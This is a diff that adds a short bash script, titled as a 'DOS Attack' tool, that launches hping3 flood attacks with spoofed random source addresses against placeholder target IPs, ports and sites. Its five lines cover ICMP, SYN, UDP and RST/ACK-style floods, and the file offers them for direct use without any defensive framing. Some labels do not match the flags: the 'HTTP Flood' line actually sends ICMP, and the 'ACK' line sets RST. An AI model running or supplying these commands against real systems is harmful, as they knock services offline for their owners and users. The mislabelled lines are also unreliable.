@@ -1,0 +1,15 @@
+#!/bin/bash
+
+echo "============================"
+echo "  Hping3 DOS Attack Scans!  "
+echo "============================"
+
+
+echo "Hping3 - HTTP Flood" | sudo hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP
+echo "Hping3 - Advanced SYN-FLOOD Attack" | sudo hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
+echo "Hping3 - No Connection Handshake UDP Flood!" | sudo hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP
+echo "Hping3 - ACK Flood Legit Requests To Host" | sudo hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP 
+echo "Hping3 - ICMP Flood Main Attack To Host" | sudo hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP 
+ 
+
+
